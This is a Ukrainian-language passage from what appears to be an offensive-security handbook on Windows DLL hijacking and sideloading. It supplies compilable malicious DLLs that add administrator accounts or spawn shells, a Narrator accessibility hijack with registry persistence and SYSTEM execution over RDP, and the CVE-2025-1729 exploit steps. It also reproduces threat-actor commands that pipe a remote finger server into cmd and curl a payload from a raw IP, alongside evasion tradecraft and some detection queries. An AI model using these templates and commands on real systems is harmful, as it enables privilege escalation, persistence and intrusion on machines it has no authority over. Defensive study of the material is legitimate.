У багатьох випадках DLL, яку ви компілюєте, має **експортувати кожну функцію, яку імпортує процес-жертва**. Якщо потрібного експорту немає, бінарний файл не зможе його розв’язати, і експлойт не спрацює.

<details>
<summary>Шаблон C DLL (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Приклад C++ DLL зі створенням користувача</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Альтернативна DLL на C з точкою входу потоку</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### NativeAOT DLL з ініціалізацією, що запускається експортованою функцією

Автономну **спільну бібліотеку .NET NativeAOT** можна використати як підкладену native DLL без реалізації явної `DllMain`. Експортуйте статичні методи C# за допомогою `[UnmanagedCallersOnly(EntryPoint = "...")]`; коли native host викликає одну з цих згенерованих компілятором точок входу, NativeAOT ініціалізує модуль, а метод `[ModuleInitializer]` запускається перед виконанням експортованого коду C#. Для роботи результату не потрібно окремо встановлювати середовище виконання .NET.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

DLL усе одно має містити **назви експортованих функцій і сумісні з ABI сигнатури**, які викликає вибраний host. Мінімальних заглушок може бути достатньо для запуску ініціалізації, але відсутні експорти можуть завадити завантаженню, а неправильна сигнатура — пошкодити виклик. Перерахуйте імпорти host і перевірте результат за допомогою `dumpbin /exports payload.dll`, перш ніж перейменувати вихідний файл на ім’я залежності, очікуване host.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>Мінімальна експортована DLL NativeAOT</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

Налаштуйте проєкт як самодостатню нативну бібліотеку Windows зі спільним доступом:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Розмістіть перейменовану DLL поруч зі скопійованим вразливим виконуваним файлом і запустіть host через шлях виконання коду, який викликає сумісний export. Такий підхід з initializer дає змогу не розміщувати складну логіку безпосередньо в `DllMain`, але передумови для sideload залишаються незмінними: loader має знаходити залежність за назвою, вибирати каталог застосунку й не знаходити її раніше через KnownDLLs, уже завантажений модуль, перенаправлення SxS або обмежені прапорці `LOAD_LIBRARY_SEARCH_*`.<sup>[[26]](#references)[[30]](#references)</sup>

Типові native-шаблони див. у [Windows C payloads](../windows-c-payloads.md). Перший етап, завантажений через sideload, згодом може виконати [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe), але це окрема техніка ін’єкції, а не частина розв’язання залежностей DLL.

## Виявлення: завантаження бібліотек із маскуванням DLL

Elastic Defend 9.5.0 доповнює подію завантаження бібліотеки полем `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"`, якщо завантажений файл не підписаний Microsoft, а його ім’я файлу збігається з назвою DLL Windows/системної DLL у кешованому інвентарі Elastic. Завдяки цьому інвентаризація назв файлів, аналіз розташування в системі та підпису виконуються в сенсорі кінцевої точки; тож основний EQL можна скоротити до:<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Розглядайте enrichment як цінний pivot, а не як самостійний доказ. Підвищуйте рівень упевненості, якщо підписаний host завантажує DLL із власного **каталогу, доступного для запису користувачам**, DLL не підписана або не є довіреною, а `dll.Ext.relative_file_creation_time` показує, що її було створено незадовго до завантаження. Обмежуйте виключення точною комбінацією видавця, процесу host і шляху встановлення; не приглушуйте сповіщення глобально для DLL із конфліктною назвою, оскільки легітимні інсталятори та застосунки можуть постачати приватні бібліотеки із системоподібними назвами.<sup>[[26]](#references)</sup>

На сенсорах без такого enrichment наближено визначайте цю поведінку, корелюючи конфліктну назву DLL із шляхом завантаження поза системними каталогами, відсутнім або недовіреним підписом Microsoft і коротким інтервалом між створенням файла та його завантаженням. Для цього потрібні актуальний список назв DLL і вузькі виключення для `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS` та інших схвалених шляхів розгортання.<sup>[[26]](#references)</sup>

## Практичний приклад: DLL Hijack локалізації Narrator OneCore TTS (спеціальні можливості/ATs)

Windows Narrator.exe досі під час запуску перевіряє передбачувану DLL локалізації для певної мови, яку можна підмінити для довільного виконання коду та persistence.<sup>[[7]](#references)</sup>

Основні факти
- Шлях перевірки (поточні збірки): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Застарілий шлях (старіші збірки): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Якщо за шляхом OneCore є контрольована зловмисником DLL, доступна для запису, вона завантажується, а `DllMain(DLL_PROCESS_ATTACH)` виконується. Експорти не потрібні.

Виявлення за допомогою Procmon
- Фільтр: `Process Name is Narrator.exe` і `Operation is Load Image` або `CreateFile`.
- Запустіть Narrator і спостерігайте за спробою завантажити вказаний вище файл.

Мінімальна DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC silence
- Наївний hijack озвучуватиме події або підсвічуватиме UI. Щоб залишатися непомітним, під час attach перелічіть потоки Narrator, відкрийте головний потік (`OpenThread(THREAD_SUSPEND_RESUME)`) і призупиніть його через `SuspendThread`; продовжуйте роботу у власному потоці. Повний код див. у PoC.<sup>[[8]](#references)</sup>

Тригер і persistence через конфігурацію Accessibility
- Контекст користувача (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Після цього запуск Narrator завантажить підкладену DLL. На secure desktop (екрані входу) натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваша DLL виконається від імені SYSTEM на secure desktop.

Виконання від імені SYSTEM через RDP (lateral movement)
- Дозвольте класичний рівень безпеки RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Підключіться до хоста через RDP і на екрані входу натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваша DLL виконається від імені SYSTEM на secure desktop.
- Виконання припиниться після закриття сеансу RDP — оперативно виконайте inject/migrate.

Bring Your Own Accessibility (BYOA)
- Можна клонувати запис реєстру вбудованого Accessibility Tool (AT) (наприклад, CursorIndicator), змінити його так, щоб він указував на довільний binary/DLL, імпортувати його, а потім задати `configuration` рівним назві цього AT. Це дає змогу запускати довільний код через framework Accessibility.

Примітки
- Для запису в `%windir%\System32` і зміни значень HKLM потрібні права адміністратора.
- Усю логіку payload можна розмістити в `DLL_PROCESS_ATTACH`; exports не потрібні.

## Практичний приклад: CVE-2025-1729 — підвищення привілеїв за допомогою TPQMAssistant.exe

У цьому прикладі показано **Phantom DLL Hijacking** у Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), що відстежується як **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Деталі вразливості

- **Компонент**: `TPQMAssistant.exe`, розташований у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Заплановане завдання**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` запускається щодня о 9:30 від імені користувача, який увійшов у систему.
- **Дозволи на каталог**: каталог доступний для запису `CREATOR OWNER`, що дає локальним користувачам змогу розміщувати довільні файли.
- **Поведінка пошуку DLL**: спочатку програма намагається завантажити `hostfxr.dll` із робочого каталогу й записує "NAME NOT FOUND", якщо DLL відсутня. Це вказує на пріоритет пошуку в локальному каталозі.

### Реалізація експлойта

Зловмисник може розмістити шкідливу заглушку `hostfxr.dll` у тому самому каталозі, використавши відсутню DLL для виконання коду в контексті користувача:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Потік атаки

1. Як звичайний користувач, помістіть `hostfxr.dll` у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Дочекайтеся запуску запланованого завдання о 9:30 під контекстом поточного користувача.
3. Якщо під час виконання завдання ввійшов адміністратор, шкідлива DLL запускається в сеансі адміністратора з середнім рівнем цілісності.
4. Застосуйте стандартні методи обходу UAC, щоб підвищити привілеї від середнього рівня цілісності до SYSTEM.

## Приклад: MSI CustomAction Dropper + DLL Side-Loading через підписаний Host (wsc_proxy.exe)

Зловмисники часто поєднують dropper на основі MSI з DLL side-loading, щоб виконувати payload у довіреному підписаному процесі.<sup>[[10]](#references)</sup>

Огляд ланцюжка
- Користувач завантажує MSI. Під час встановлення через GUI непомітно запускається CustomAction (наприклад, LaunchApplication або дія VBScript), яка відновлює наступний етап із вбудованих ресурсів.
- Dropper записує легітимний підписаний EXE і шкідливу DLL в один каталог (приклад пари: підписаний Avast `wsc_proxy.exe` + контрольований зловмисником `wsc.dll`).
- Після запуску підписаного EXE порядок пошуку DLL у Windows спочатку знаходить `wsc.dll` у робочому каталозі, запускаючи код зловмисника в підписаному батьківському процесі (ATT&CK T1574.001).

Аналіз MSI (на що звертати увагу)
- Таблиця CustomAction:
  - Шукайте записи, які запускають виконувані файли або VBScript. Приклад підозрілого шаблону: LaunchApplication, що запускає вбудований файл у фоновому режимі.
  - В Orca (Microsoft Orca.exe) перевірте таблиці CustomAction, InstallExecuteSequence і Binary.
- Вбудовані/розділені payload у CAB-файлі MSI:
  - Адміністративне розпакування: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Або скористайтеся lessmsi: lessmsi x package.msi C:\out
  - Шукайте кілька невеликих фрагментів, які об’єднуються та розшифровуються CustomAction на VBScript. Типовий процес:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Практичний sideloading з wsc_proxy.exe
- Розмістіть ці два файли в одній папці:
  - wsc_proxy.exe: легітимний підписаний хост (Avast). Процес намагається завантажити wsc.dll за назвою з тієї ж папки.
  - wsc.dll: DLL зловмисника. Якщо певні exports не потрібні, достатньо DllMain; інакше створіть proxy DLL і перенаправте потрібні exports до справжньої бібліотеки, запустивши payload у DllMain.
- Створіть мінімальний payload DLL:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Для вимог до export використовуйте framework для проксіювання (наприклад, DLLirant/Spartacus), щоб створити forwarding DLL, яка також виконує ваш payload.

- Ця техніка покладається на визначення імені DLL хост-бінарником. Якщо хост використовує абсолютні шляхи або прапорці безпечного завантаження (наприклад, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack може не спрацювати.
- KnownDLLs, SxS і forwarded exports можуть впливати на пріоритет завантаження, тому їх потрібно враховувати під час вибору хост-бінарника та набору export.

## Підписані тріади + зашифровані payloads (розбір випадку ShadowPad)

Check Point описала, як Ink Dragon розгортає ShadowPad за допомогою **тріади з трьох файлів**, щоб маскуватися під легітимне ПЗ і зберігати основний payload зашифрованим на диску:<sup>[[12]](#references)</sup>

1. **Підписаний хостовий EXE** – зловмисники використовують продукти таких виробників, як AMD, Realtek або NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Зловмисники перейменовують виконуваний файл так, щоб він був схожий на бінарний файл Windows (наприклад, `conhost.exe`), але підпис Authenticode залишається дійсним.
2. **Шкідлива loader DLL** – розміщується поруч із EXE під очікуваною назвою (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Зазвичай ця DLL є бінарним файлом MFC, обфускованим за допомогою framework ScatterBrain; її єдине завдання – знайти зашифрований blob, розшифрувати його та виконати reflective mapping ShadowPad.
3. **Зашифрований payload blob** – часто зберігається в тому самому каталозі як `<name>.tmp`. Після відображення розшифрованого payload у пам’ять loader видаляє TMP-файл, щоб знищити криміналістичні докази.

Примітки щодо tradecraft:

* Перейменування підписаного EXE зі збереженням початкового `OriginalFileName` у заголовку PE дає змогу видати його за бінарний файл Windows і водночас зберегти підпис виробника. Тож наслідуйте звичку Ink Dragon розміщувати бінарні файли, схожі на `conhost.exe`, але насправді належні утилітам AMD/NVIDIA.
* Оскільки виконуваний файл залишається довіреним, для більшості засобів контролю allowlisting достатньо, щоб ваша шкідлива DLL лежала поруч із ним. Зосередьтеся на налаштуванні loader DLL; підписаний батьківський файл зазвичай можна запускати без змін.
* Decryptor ShadowPad очікує, що TMP blob буде розташований поруч із loader і матиме права на запис, щоб після відображення обнулити файл. Залиште каталог доступним для запису, доки payload не завантажиться; після завантаження в пам’ять TMP-файл можна безпечно видалити для OPSEC.

### Ланцюжок sideloading зі stager LOLBAS і staged archive (finger → tar/curl → WMI)

Оператори поєднують DLL sideloading із LOLBAS, щоб єдиним власним артефактом на диску була шкідлива DLL поруч із довіреним EXE:<sup>[[1]](#references)</sup>

- **Завантажувач віддалених команд (Finger):** прихований PowerShell запускає `cmd.exe /c`, отримує команди із сервера Finger і передає їх у `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` отримує текст через TCP/79; `| cmd` виконує відповідь сервера, даючи операторам змогу змінювати second stage на сервері.

- **Вбудоване завантаження/розпакування:** Завантажте архів із нешкідливим розширенням, розпакуйте його та розмістіть sideload target разом із DLL у випадковій папці `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` приховує перебіг завантаження та переходить за перенаправленнями; `tar -xf` використовує вбудований у Windows tar.

- **Запуск через WMI/CIM:** Запустіть EXE через WMI, щоб телеметрія показувала процес, створений через CIM, під час завантаження DLL, розміщеної поруч:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Працює з бінарними файлами, які віддають перевагу локальним DLL (наприклад, `intelbq.exe`, `nearby_share.exe`); payload (наприклад, Remcos) запускається під довіреною назвою.

- **Пошук:** створюйте сповіщення про `forfiles`, якщо одночасно присутні `/p`, `/m` і `/c`; зазвичай таке трапляється лише в адміністративних скриптах.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Під час нещодавнього вторгнення Lotus Blossom зловмисники використали довірений ланцюжок оновлення для доставки dropper, запакованого за допомогою NSIS, який розміщував DLL sideload і payload, що повністю працювали в пам’яті.<sup>[[13]](#references)</sup>

Послідовність дій
- `update.exe` (NSIS) створює `%AppData%\Bluetooth`, позначає його як **HIDDEN**, розміщує перейменований Bitdefender Submission Wizard `BluetoothService.exe`, шкідливий `log.dll` і зашифрований blob `BluetoothService`, а потім запускає EXE.
- EXE хоста імпортує `log.dll` і викликає `LogInit`/`LogWrite`. `LogInit` завантажує blob за допомогою mmap; `LogWrite` розшифровує його за допомогою потокового шифру на основі власної LCG (константи **0x19660D** / **0x3C6EF35F**, матеріал ключа отримано з попереднього хешу), перезаписує буфер відкритим shellcode, звільняє тимчасові дані й передає йому керування.
- Щоб не використовувати IAT, loader визначає API, хешуючи назви експортів за допомогою **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, а потім застосовує avalanche-перетворення в стилі Murmur (**0x85EBCA6B**) і порівнює результат із цільовими хешами з сіллю.

Основний shellcode (Chrysalis)
- Розшифровує основний модуль, схожий на PE, повторюючи додавання/XOR/віднімання з ключем `gQ2JR&9;` у п’ять проходів, а потім динамічно завантажує `Kernel32.dll` → `GetProcAddress`, щоб завершити розв’язання імпортів.
- Відновлює рядки з назвами DLL під час виконання за допомогою побайтових перетворень із циклічним зсувом/XOR, а потім завантажує `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Використовує другий resolver, який проходить шляхом **PEB → InMemoryOrderModuleList**, розбирає кожну таблицю експортів блоками по 4 байти із застосуванням змішування в стилі Murmur і викликає `GetProcAddress` лише тоді, коли хеш не знайдено.

Вбудована конфігурація та C2
- Конфігурація міститься у скинутому файлі `BluetoothService` за **зміщенням 0x30808** (розмір **0x980**) і розшифровується за допомогою RC4 з ключем `qwhvb^435h&*7`, що розкриває URL C2 і User-Agent.
- Для beacon-запитів формується профіль хоста з полями, розділеними крапками, додається тег `4Q`, а потім дані шифруються RC4 із ключем `vAuig34%^325hGV` перед викликом `HttpSendRequestA` через HTTPS. Відповіді розшифровуються RC4 і обробляються перемикачем за тегами (`4T` shell, `4V` виконання процесу, `4W/4X` запис файлу, `4Y` читання/exfil, `4\\` видалення, `4` перелічення дисків/файлів + випадки передачі частинами).
- Режим виконання визначається аргументами CLI: без аргументів — встановлення persistence (служба/ключ Run), що вказує на `-i`; `-i` перезапускає себе з `-k`; `-k` пропускає встановлення й запускає payload.

Виявлений альтернативний loader
- Під час того самого вторгнення було скинуто Tiny C Compiler і виконано `svchost.exe -nostdlib -run conf.c` з `C:\ProgramData\USOShared\`, а поруч із ним розміщено `libtcc.dll`. Наданий зловмисником вихідний код C містив shellcode, компілювався і запускався в пам’яті, не створюючи PE-файл на диску. Відтворіть це за допомогою:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- На цьому етапі компіляції та запуску на основі TCC імпортувався `Wininet.dll` під час виконання, а з жорстко заданої URL-адреси завантажувався shellcode другого етапу, що забезпечувало гнучкий завантажувач, який маскувався під запуск компілятора.

## Sideloading підписаного хоста з проксіюванням export і призупиненням потоку хоста

У деяких ланцюжках DLL sideloading додають **заходи для підвищення стабільності**, щоб легітимний хост залишався запущеним достатньо довго для коректного завантаження наступних етапів, а не аварійно завершувався після завантаження шкідливої DLL.<sup>[[11]](#references)</sup>

Спостережуваний шаблон
- Розмістити довірений EXE поруч зі шкідливою DLL, використовуючи очікуване ім’я залежності, наприклад `version.dll`.
- Шкідлива DLL **проксіює кожен очікуваний export** до справжньої системної DLL (наприклад, `%SystemRoot%\\System32\\version.dll`), щоб розв’язання імпортів продовжувало працювати, а процес хоста не припиняв роботу.
- Після завантаження шкідлива DLL **патчить точку входу хоста**, щоб основний потік потрапляв у нескінченний цикл `Sleep`, а не завершувався чи виконував код, який міг би припинити процес.
- Новий потік виконує власне шкідливе завдання: розшифровує ім’я або шлях DLL наступного етапу (часто використовуються RC4/XOR), а потім запускає її за допомогою `LoadLibrary`.

Чому це важливо
- Звичайне проксіювання DLL зберігає сумісність API, але не гарантує, що хост залишатиметься запущеним достатньо довго для наступних етапів.
- Призупинення основного потоку за допомогою `Sleep(INFINITE)` — це простий спосіб залишити підписаний процес активним, поки завантажувач виконує розшифрування, підготовку етапів або початкове налаштування мережевого з’єднання в робочому потоці.
- Пошук лише підозрілого `DllMain` може не виявити цей шаблон, якщо цікава поведінка починається після патчення точки входу хоста та запуску вторинного потоку.

Мінімальний робочий процес
1. Скопіювати підписаний EXE хоста та визначити, яку DLL він завантажує з локального каталогу.
2. Створити проксі-DLL, що експортує ті самі функції та перенаправляє виклики до легітимної DLL.
3. У `DllMain(DLL_PROCESS_ATTACH)` створити робочий потік.
4. У цьому потоці пропатчити точку входу хоста або процедуру запуску основного потоку так, щоб він зациклився на `Sleep`.
5. Розшифрувати ім’я/конфігурацію DLL наступного етапу та викликати `LoadLibrary` або вручну відобразити payload у пам’ять.

Напрями для захисного аналізу
- Підписані процеси, які завантажують `version.dll` або подібні поширені бібліотеки з власного каталогу застосунку, а не з `System32`.
- Патчі пам’яті в точці входу процесу невдовзі після завантаження образу, особливо переходи/виклики, перенаправлені до `Sleep`/`SleepEx`.
- Потоки, створені проксі-DLL, які одразу викликають `LoadLibrary` для другої DLL із розшифрованим ім’ям.
- Повні проксі-DLL, розміщені поруч із виконуваними файлами виробника в доступних для запису каталогах підготовки, як-от `ProgramData`, `%TEMP%` або шляхи розпакованих архівів.

## References

- [1] [Red Canary – Аналітичні огляди розвідданих: січень 2026 року](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 — підвищення привілеїв за допомогою TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store — застосунок TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna — TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc — DLL hijacking у Windows. Простий приклад на C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research — Nimbus Manticore розгортає нове шкідливе ПЗ, націлене на Європу](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec — Hack-cessibility: коли DLL hijack поєднується з помічниками Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC — api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 — Цифрові двійники: анатомія еволюційних кампаній із видаванням себе за інших, що поширюють Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 — Спільні інтереси: аналіз кластерів загроз, націлених на уряд країни Південно-Східної Азії](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research — Усередині Ink Dragon: розкриття ретрансляційної мережі та внутрішньої будови прихованої наступальної операції](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 — Бекдор Chrysalis: детальний аналіз набору інструментів Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf — HTB Bruno: ланцюжок ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 — Відстеження шпигунських кампаній 2026 року іранського APT Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn — елемент `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn — елемент `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn — елемент `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn — елемент `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn — елемент `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn — елемент `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research — Швидко й рішуче: операції Nimbus Manticore під час іранського конфлікту](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn — дії завдань](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK — T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 — CL-STA-1062 націлюється на уряди та критичну інфраструктуру країн Південно-Східної Азії](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs — відтворення та виявлення DLL hijacking за порядком пошуку в Windows за допомогою Elastic Defend 9.5.0](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn — створення нативних бібліотек за допомогою Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn — нативні exports за допомогою Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn — ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn — порядок пошуку бібліотек динамічного компонування](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn — формат PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs — виявлення варіанта SectopRAT, вбудованого в легітимне програмне забезпечення](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant — викрадення LIGHTSHOW (частина перша)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist — операція FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
